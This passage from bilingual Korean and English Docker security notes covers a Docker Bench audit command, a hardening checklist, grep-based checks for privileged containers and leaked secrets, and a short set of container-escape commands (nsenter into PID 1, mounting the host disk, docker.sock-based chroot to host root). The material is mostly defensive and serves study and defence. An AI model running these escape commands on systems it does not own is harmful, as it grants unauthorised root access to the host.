# Docker Bench for Security 실행
docker run --rm \
  --net host \
  --pid host \
  --userns host \
  --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /lib/systemd/system:/lib/systemd/system:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

---

## 7. 방어 체크리스트

| 항목 | 위험도 | 대응 |
|------|--------|------|
| `--privileged` 제거 | CRITICAL | 최소 캐퍼빌리티만 부여 |
| Docker 소켓 마운트 금지 | CRITICAL | 소켓 대신 Docker API TLS 사용 |
| TCP 2375 비인증 차단 | CRITICAL | TLS + 클라이언트 인증서 필수 |
| 비root 사용자 실행 | HIGH | Dockerfile에 USER 지정 |
| read-only 루트 FS | HIGH | `--read-only` 플래그 |
| Seccomp 프로파일 | MEDIUM | 기본 프로파일 또는 커스텀 |
| 이미지 서명 검증 | MEDIUM | DOCKER_CONTENT_TRUST=1 |
| 정기 이미지 스캔 | MEDIUM | CI/CD 파이프라인 통합 |

---

<!-- detect-validate-29 -->
## Docker 컨테이너 공격 탐지와 방어 검증

Docker 공격은 *privileged 컨테이너·docker.sock 노출·취약 이미지·시크릿 누출*을 노린다. 방어자는 **자체 컨테이너가 권한 최소화되고 탈출 표면이 닫혔는가**를 검증해야 한다. 검증은 **소유 호스트**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| privileged 컨테이너 | --privileged·과도 cap | 비권한·cap-drop | privileged 플래그 |
| docker.sock 마운트 | 소켓 노출 | 소켓 미마운트·소켓 프록시 | 컨테이너 내 docker.sock |
| 취약/미서명 이미지 | 알려진 CVE | 이미지 스캔·서명 | 구버전 베이스 |
| 시크릿 누출 | ENV/레이어 평문 | 시크릿 마운트·BuildKit | 이미지 history 평문 |

### 방어 검증 (직접 확인)

```bash
# 1) 실행 중 컨테이너의 권한/소켓 노출 점검(소유 호스트) — privileged·docker.sock
docker ps -q | xargs -r docker inspect --format '{{.Name}} priv={{.HostConfig.Privileged}} mounts={{range .Mounts}}{{.Source}} {{end}}' 2>/dev/null | grep -iE "priv=true|docker.sock"
# 2) 이미지 레이어 평문 시크릿 점검 — history에 ENV/ARG 노출
docker history --no-trunc myimage:latest 2>/dev/null | grep -iE "password|secret|api[_-]?key|token" | head
```

> Docker 방어는 *권한이 최소이고 탈출 표면이 닫혔는가*다 — "컨테이너 돈다"와 "privileged가 없고 docker.sock이 안 마운트되며 이미지에 평문 시크릿이 없다"는 다르다. 소유 호스트에서 권한·소켓·시크릿을 직접 확인한다([[70_Kubernetes_Security]], [[18_DevSecOps]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# Docker Security: Container Escape and Vulnerability Analysis

## 1. Docker Security Overview

Docker containers share the host kernel but are isolated by namespaces and cgroups. Key attack vectors include:

- **Privileged container escape**: Full host access when `--privileged` flag is used
- **Docker socket exposure**: `/var/run/docker.sock` mount gives root-equivalent access
- **Volume mount abuse**: Mounting sensitive host paths
- **Image vulnerabilities**: Outdated base images with known CVEs

## Key Security Hardening Measures

| Measure | Priority | Implementation |
|---------|----------|---------------|
| Run as non-root user | HIGH | Specify USER in Dockerfile |
| Read-only root FS | HIGH | `--read-only` flag |
| Seccomp profile | MEDIUM | Default profile or custom |
| Image signature verification | MEDIUM | DOCKER_CONTENT_TRUST=1 |
| Periodic image scanning | MEDIUM | CI/CD pipeline integration |

## Container Escape Techniques

### Privileged Container Escape
```bash
# Mount host filesystem from privileged container
nsenter -t 1 -m -u -i -n -p -- bash

# Or via device access
fdisk -l
mount /dev/sda1 /mnt/host
```

### Docker Socket Escape
```bash
# If /var/run/docker.sock is mounted inside container
docker run -v /:/hostroot --rm -it ubuntu bash
chroot /hostroot
```

### Capability Abuse
```bash
# CAP_SYS_ADMIN allows mount operations
mount -t tmpfs tmpfs /tmp
nsenter -t 1 -m -u -i -n -p -- bash
```

<!-- detect-validate-29 -->
## Docker Container Attack Detection and Defense Validation

Docker attacks target *privileged containers, exposed docker.sock, vulnerable images, and secret leakage*. Defenders must verify **whether their containers are least-privileged and the escape surface is closed**. Validate only on **owned hosts**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Privileged container | --privileged, excess caps | Non-privileged, cap-drop | privileged flag |
| docker.sock mount | Socket exposure | No socket mount, socket proxy | docker.sock inside container |
| Vulnerable/unsigned image | Known CVEs | Image scan, signing | Old base image |
| Secret leakage | Plaintext ENV/layers | Secret mounts, BuildKit | Plaintext in image history |

### Defense validation (verify directly)

```bash
# 1) Check running containers for privilege/socket exposure (owned host) — privileged, docker.sock
docker ps -q | xargs -r docker inspect --format '{{.Name}} priv={{.HostConfig.Privileged}} mounts={{range .Mounts}}{{.Source}} {{end}}' 2>/dev/null | grep -iE "priv=true|docker.sock"
# 2) Check image layers for plaintext secrets — ENV/ARG exposed in history
docker history --no-trunc myimage:latest 2>/dev/null | grep -iE "password|secret|api[_-]?key|token" | head
```

> Docker defense is *whether privilege is minimal and the escape surface is closed* -- "the container runs" differs from "there's no privileged, docker.sock isn't mounted, and the image has no plaintext secrets". Confirm privilege, socket, and secrets on owned hosts directly ([[70_Kubernetes_Security]], [[18_DevSecOps]], [[13_SOC_Blue_Team]]).
